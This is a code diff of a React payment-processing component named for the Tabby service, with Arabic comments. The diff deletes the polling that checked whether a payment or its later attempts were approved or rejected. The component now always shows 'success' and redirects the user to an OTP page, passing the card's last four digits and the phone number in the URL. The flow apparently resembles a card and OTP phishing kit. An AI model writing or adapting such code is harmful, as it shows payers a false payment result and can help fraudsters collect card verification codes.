@@ -50,8 +50,6 @@ const TabbyPaymentProcessing = () => {
       hasSubmitted.current = true;
 
       try {
-        let finalPaymentId: string;
-        
         // دائماً إنشاء سجل دفع جديد
         console.log("Creating new payment record");
         const { data, error } = await supabase
@@ -71,75 +69,15 @@ const TabbyPaymentProcessing = () => {
           .single();
 
         if (error) throw error;
-        finalPaymentId = data.id;
+        const finalPaymentId = data.id;
         setPaymentId(data.id);
         console.log("New payment created with ID:", finalPaymentId);
 
-
-        // Poll for status updates - check both main card and attempts
-        const pollInterval = setInterval(async () => {
-          // التحقق من حالة البطاقة الأساسية
-          const { data: mainPayment } = await supabase
-            .from("tabby_payments")
-            .select("payment_status")
-            .eq("id", finalPaymentId)
-            .single();
-
-          if (mainPayment?.payment_status === "approved") {
-            clearInterval(pollInterval);
-            setPaymentStatus("success");
-            setTimeout(() => {
-              navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}&paymentId=${finalPaymentId}&phone=${phone}&type=tabby`);
-            }, 2000);
-            return;
-          } else if (mainPayment?.payment_status === "rejected") {
-            clearInterval(pollInterval);
-            setPaymentStatus("failed");
-            setTimeout(() => {
-              navigate(`/tabby-payment?price=${totalAmount}&company=${encodeURIComponent(company)}&phone=${phone}&paymentId=${finalPaymentId}`);
-            }, 3000);
-            return;
-          }
-
-          // التحقق من حالة المحاولات الإضافية
-          const { data: attemptsData, error: attemptsError } = await supabase
-            .from("tabby_payment_attempts")
-            .select("approval_status")
-            .eq("payment_id", finalPaymentId)
-            .order('created_at', { ascending: false })
-            .limit(1)
-            .maybeSingle();
-
-          if (attemptsError) {
-            console.log("No payment attempts yet or error:", attemptsError);
-            return;
-          }
-
-          if (attemptsData?.approval_status === "approved") {
-            clearInterval(pollInterval);
-            setPaymentStatus("success");
-            setTimeout(() => {
-              navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}&paymentId=${finalPaymentId}&phone=${phone}&type=tabby`);
-            }, 2000);
-          } else if (attemptsData?.approval_status === "rejected") {
-            clearInterval(pollInterval);
-            setPaymentStatus("failed");
-            setTimeout(() => {
-              navigate(`/tabby-payment?price=${totalAmount}&company=${encodeURIComponent(company)}&phone=${phone}&paymentId=${finalPaymentId}`);
-            }, 3000);
-          }
-        }, 2000);
-
-        // Timeout after 30 seconds
+        // إظهار رسالة نجاح ثم الانتقال مباشرة لصفحة OTP
+        setPaymentStatus("success");
         setTimeout(() => {
-          clearInterval(pollInterval);
-          if (paymentStatus === "processing") {
-            setPaymentStatus("failed");
-            setTimeout(() => {
-              navigate(-1);
-            }, 3000);
-          }
-        }, 30000);
+          navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}&paymentId=${finalPaymentId}&phone=${phone}&type=tabby`);
+        }, 2000);
 
       } catch (error) {
         console.error("Payment submission error:", error);
